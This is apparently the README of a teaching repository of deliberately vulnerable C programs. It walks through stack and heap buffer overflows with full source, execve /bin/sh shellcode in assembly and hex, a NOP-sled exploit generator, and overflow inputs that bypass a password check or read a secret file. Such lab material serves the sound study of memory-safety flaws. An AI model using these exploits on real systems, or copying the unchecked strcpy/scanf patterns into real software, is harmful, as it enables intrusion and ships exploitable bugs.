# overflow_with_joy

This is a collection of small demo programs written in c that are vulnerable for overflows and exploits.

- [overflow_with_joy](#overflow-with-joy)
  * [Background](#background) and general explanations
  * [Setup](#setup)
    + [compiling everything](#compiling-everything)
    + [creating shellcode bytes](#creating-shellcode-bytes)
  * [Hackme 1](#hackme-1) executes whatever shellcode is inserted. Use it to start a new shell.
  * [Hackme 2](#hackme-2) checks a password, but a buffer overflow makes it possible to overwrite the variable.
  * [Hackme 3](#hackme-3) has a function pointer that can be overwritten with a buffer overflow, causing the user to hit the jackpot.
  * [Hackme 4](#hackme-4) 
  * [Hackme 5](#hackme-5) can be manipulated with a buffer overflow to execute code on the stack, e.g. to start a new shell.
  * [Hackme 6](#hackme-6) shows a very simple heap overflow that can be exploited to display the contents of a secret file.



## Background ##

The memory of a program is seperated in different parts, including text for the code, data, bss, heap and stack. The data segment is for initialized static and global variables, the bss section is for uninitilized static and global variables. The heap is for dynamic memory accessed with new() or malloc(), and the stack contains local variables and some other information. When a function is executed, it uses the stack to store its variables, parameters for other functions to call, some information about the control flow and so on. For example, when a program enters a function, it has to save the address of the next instruction to execute when it is done with the function and wants to return, and this return address is saved on the stack.

The program also uses registers. The instruction pointer (eip in 32 bit, rip in 64 bit architectures) points to the next instruction the program will execute. The RSP (stack pointer) points to the top of the stack, where variables would be pushed onto and popped from the stack. The rbp (base pointer) points to the beginning of the stack at the very bottom for this specific function. Underneath the rbp lies the old rbp of the function that was called this function, and the return address to jump back.

![Stack](https://github.com/LauraWartschinski/overflow_with_joy/blob/master/img/stack.png)

Some vulnerabilities in code can make it possible to manipulate that stack, e.g. to overwrite the return address, which will cause the programm to jump to a different place in the memory and possibly execute instructions there. Many times, this happens because a buffer - a designated block of memory that stores some values of the same type - is not managed correctly, allowing for values to be written that exceed the capacity of the buffer and overwrite whatever comes next on the stack, possible until the return address (see image).

On the heap, variables are stored as well, and in a similar way, overflows can be used to manipulate the program.

For a comprehensive introduction into the topic of buffer overflows and executing shell code on the stack, see [smashing the stack for fun and profit](http://www-inst.eecs.berkeley.edu/~cs161/fa08/papers/stack_smashing.pdf).


## Setup ##

### compiling everything ###
To compile the files with the flags, execute
```./compile-all.sh```
All code is compiled with some flags that make it easier to execute exploits:  `-fno-stack-protector` to not include stack canaries etc., `-z execstack` to make the stack executable, and `-O0` to remove optimizations. All exploits are made to execute on a 64 bit architecture and are tested in Ubuntu 18.04. The full command is for example 
`gcc hackme1.c -o hackme1 -O0 -fno-stack-protector -z execstack -g`. This script also disables ASLR (stack randomization), which helps because the memory addresses will stay the same between two executions of the program. 

### creating shellcode bytes ###

![makeshellcode script](https://github.com/LauraWartschinski/overflow_with_joy/blob/master/img/makeshellcode.png)

There is also a script `makeshellcode.sh`, which will automatically generate the bytes of assembly code for the instructions specified in `shellcode-creator.c`. It does so by starting the gdb and using its disass function to look at the bytes, to speed up the process of manual inspection. However, it will stop at the first `ret` instruction it encounters. As long as you don't use this, it's fine. Otherwise you might just need to figure out the instructions yourself. 


## Hackme 1 ##

To warm up, let's have a look at a program that was made to be exploited. This is the sourcecode for `hackme1.c`.

```
int main(void)
{
    char shellcode[] = "[shellcode here]";
 
    (*(void (*)()) shellcode)();
     
    return 0;
}
```

This very simple program takes some shellcode and executes it. This is possible because the variable shellcode is casted to a function pointer of the type `void (*)()`, a function pointer for an unspecified number of parameters. Therefore, the shellcode is cast into a function and then calls it, essentially running the shellcode.

In `exploit1.c`, shellcode is inserted that will cause the program to set the registers correctly and then execute a syscall, which will start a new shell. The following assembly commands achieve this while also avoiding any null bytes. There are, however, many other ways to achieve the same goal. 

```
"jmp j2;" //short jump to avoid null bytes in the shellcode
"j1: jmp start;" //jump to the rest of the shellcode
"j2: call j1;" //put the address of the string /bin/sh on the stack
".ascii \"/bin/shX\";"
"start: pop %rdi;" //take the address of the string /bin/sh from the stack
"xor %rax, %rax;" //set RAX to zero
"movb %al, 7(%rdi);" //set a nullbyte after the /bin/sh in the written file
"mov $0x3b, %al;" //put the syscall number in rax, in this case execve
"xor %rsi,%rsi;" //RSI must be set to zero
"xor %rdx,%rdx;" //RDX must be set to zero    
"syscall;" //start the 
```


## Hackme 2 ##

In the next example, we are looking at a C program that was not made to be exploited, but contains a buffer overflow vulnerability. The program takes an input as argument and checks if that input is correct, displaying either "password correct" or "wrong password". Of course, it might execute some other functionality, but this is just a minimal example. The goal here is to get the program to execute the code for the correct password, without actually entering the correct password. If it crashes later, that's okay, since the goal was reached anyway. 

The programm can simply be executed with `./hackme2 mypassword`. This is the sourcecode: 

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int check_password(char *password){
  int correct = 0;
  char password_buffer[16];
  
  strcpy(password_buffer, password);
  
  if (strcmp(password_buffer, "actualpw") == 0) {
    correct = 1;
  }
  
  return correct;
  
  
}


int main (int argc, char *argv[]) {
  if (argc < 2) {
		puts("Please enter your password as a command line parameter.");
  } else {
    if (check_password(argv[1])) {
      printf("Password correct.\n");
    } else {
      printf("Wrong password.\n");
    }
  }

  return 0;
  
}
``` 

In the check_password function, a buffer of length 16 is created to store the password. There is also a variable `int correct` that will contain 0 if the password is wrong, or 1 if the password was evaluated to be correct. This local variable is placed on the stack (here at location `rbp-8`, directly above the base pointer of the stack). At the end of the function, it is loaded into the register eax, which can be seen in the disassembled code of check_password at location +68. The main function then checks if eax is zero or not (with the `test %eax, %eax'` at position +54) and jumps to the different outputs depending on the result. When "actualpw" is passed to the program as paramter, the variable `correct` contains 00000001 and is there not zero, causing the program to display "oassword correct".

When the buffer in check_password gets filled with bytes, it grows in the direction of the variable `correct`. With a length of 16 bytes, it overwrites the variable to contain e.g. `0x4141414141414141`, which is also evaluated to be not zero, so the main function jumps into the "password correct" branch once more, even though the correct password was never entered. 

![exploit2](https://github.com/LauraWartschinski/overflow_with_joy/blob/master/img/exploit2.png)

The programm `exploit2` just produces the correct number of bytes as an output. Execute both with `./hackme2 $(./exploit2)`. 

## Hackme 3 ##

This program is a little game that has an element of chance. If two random three-digit numbers are the same, the user will hit the jackpot and get a lot of money. However, the program uses a function pointer to jump to the part in the code where the game is executed. And the length of the username, which is stored in a buffer on the stack, is not checked at all. This can be used to the players advantage, making the game give out a jackpot and not even crashing in the process of doing so!

![exploit3](https://github.com/LauraWartschinski/overflow_with_joy/blob/master/img/exploit3.png)


This is the code for the program:

```
#include "string.h"
#include "stdio.h"
#include "time.h"
#include "stdlib.h"

void jackpot()
{
  printf("\n\n$$$ You hit the jackpot!!! $$$\nAll money will be transferred to your account immediately.\n\n");
  return;
}

void play()
{
  srand(time(0)); 
  int random = rand()%1000;
  int number = rand()/10000000;
  printf("\n\n======PLAYING THE GAME=====\n");
  printf("The lucky number today is: %d\n", random);
  printf("You rolled: %d.\n", number);
  if (number == random){
    jackpot();
  } else {
    printf("Sadly, this means you didn't win.\n");
  }
  return;
}

int main()
{
	void (*functionptr)();
  functionptr = &play;
  char name[8];   // first name of the player
  printf("Welcome to this game of luck! What is your fist name:\n");
  scanf("%s",name);
  functionptr();
  printf("Game finished.\n");
	return 0;  
}
```

The attacker only needs to chose the username in such a way that the buffer spills over to the functionptr, which is saved on the stack directly next to the name buffer. Instead of having the functionptr point to play(), it should instead be made to point to jackpot() directly. The address of jackpot() might start with null bytes, but the attacker only has to overwrite the bytes that need to be changed. The input string `\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xca\x47\x55\x55\x55\x55` sets 8 bytes that can be anything (stored as the user's name), followed by the address of jackpot(). 

![exploit5 demo](https://github.com/LauraWartschinski/overflow_with_joy/blob/master/img/exploit5explained.png)



## Hackme 4 ##


## Hackme 5 ##

For this example, the goal is to execute some arbitrary commands that were not programmed into `hackme5.c`. This is the original sourcecode:

``` 
#include<stdio.h>
#include<string.h>
int main(int argc, char *argv[])
{
  char buf[256];
  if (argc < 2)
    puts("Please enter your name as a command line parameter.");
  else
  {
    strcpy(buf,argv[1]);
    printf("Input was: %s\n",buf);
    return 0;
  }
}
``` 

This program accepts a a parameter and then writes it out again. However, the length of the parameter is not checked, and if it exceeds the 256 byte buffer, an oveflow will occur. This makes it possible to overwrite the return address, causing the programm to jump elsewhere.

More specifically, the programmed can be made to jump up on the stack into the area of the buffer. If the buffer was filled with data that can also be interpreted as instructions, they can then be executed. By putting in the instructions to execute a syscall that starts a shell, the programm will do exactly that. The code in `exploit3.c` produces a string of bytes that serves this function. Execute both with `./hackme3 $(./exploit3)`. 

![exploit3](https://github.com/LauraWartschinski/overflow_with_joy/blob/master/img/exploit5.png)

When the return address is overwritten with an address within the stack, the execution of the programm follows that and jumps into a list of NOP instructions. This 'nop sled' accounts for small variations in the size and position of the stack. The next intructions are there to prepare the syscall execve. In register rax, the number of the syscall must be placed. Registers rdx and rsi have to be zero for this example. And rdi needs to point to a location where a string can be found that contains the name of the programm to execute, in this case `/bin/sh`. 

Since it is not known exactly at which position this string will end up, the address can be put on the stack by using `call`, which was not intended for this hacky purpose, but serves it well. By placing the address of the next 'instruction' (in this case the address of the string) on top of the stack, we can later pop it back into th register where we need it. Of course, there are many other solutions.

The shellcode presented here contains no null bytes because it has to be passed as a parameter to the programm. This is why some obvious instructions are replaced by less trivial ones which accomplish the same goal but don't contain null bytes.

![exploit5 demo](https://github.com/LauraWartschinski/overflow_with_joy/blob/master/img/exploit5screen.png)

This is the final shellcode, put into the programm `exploit.c`, which also creates the NOP slide before the actual payload starts. The \xaa bytes are for the purpose of aligning the stack correctly. Execute the exploits with `./hackme5 $(./exploit5)`. 

```
#include <stdio.h>
#include <string.h>
  
char shellcode[] = "\xeb\x02\xeb\x0d\xe8\xf9\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x58\x5f\x48\x31\xc0\x88\x47\x07\xb0\x3b\x48\x31\xf6\x48\x31\xd2\x0f\x05\xaa\xaa\xaa\xaa\xaa\xaa\x08\xdd\xff\xff\xff\x7f";

int main()
{
  int i;
  for (i = 0; i < (256 - strlen(shellcode) + 8 + 6); i++)
  {
    printf("\x90");
  }
  printf("%s",shellcode);
  return 0;
}
```


## Hackme 6 ##

This time, the heap is used to create an overflow. There are two files on the file system, `public.txt` and `secret.txt`. The following program takes the username as an argument, greets the user, and without any intended connection to the username, displays the content of `public.txt`. However, since all the data is stored on the heap, an overflow for the username can overwrite the address of the file to read, causing the programm to display the contents of `secret.txt`.


![exploit6 demo](https://github.com/LauraWartschinski/overflow_with_joy/blob/master/img/exploit6.png)

This is the sourcecode:

```
#include <stdio.h> 
#include <stdlib.h>
#include <string.h> 

//a struct to hold information about a file  
struct file  
{ 
    int id; 
    char filename[8]; 
};

//a struct to hold information about a user
struct user
{
  int id;
  char name[8];
};

  
int main (int argc, char **argv) 
{ 
  if (argc < 2) {
		puts("Please enter your name as a command line parameter.");
    
  } 
  else {

    //creating a user and a file
    struct user *userptr;
    userptr = malloc(sizeof(struct user));

    struct file *fileptr;
    fileptr = malloc(sizeof(struct file));
    fileptr->id = 1;
    strcpy(fileptr->filename, "public.txt");
    
    
    //setting the user information - on the heap, this might overwrite the information of the file
    userptr->id = 1;
    strcpy(userptr->name, argv[1]);
    
    printf("Welcome, user %s!\n\n", userptr->name);
    

    //opening some file, supposedly the file public.txt
    
    printf("On an unrelated note, opening %s.\n", fileptr->filename);
    FILE *readfile;
    readfile = fopen (fileptr->filename, "r"); 
    if (readfile == NULL)     { 
        fprintf(stderr, "Error opening file\n\n"); 
        exit (1); 
    } 


    //printing the file contents
    printf("File was successfully opened. It contains: \n");
    int c;
    while ((c = getc(readfile)) != EOF)
        putchar(c);
    putchar('\n');

  }
  return 0; 
} 
```

The space for information about the user is allocated first on the heap, and after that, space for the file is allocated. However, the information about the user is written on the heap later, which makes it possible to simply overwrite what was stored for the file on the heap with new information, e.g. the string "secret.txt" at exactly the place where `fileptr->filename` points to, causing the program to load secret.txt.


![exploit6 demo](https://github.com/LauraWartschinski/overflow_with_joy/blob/master/img/exploit6explained.png)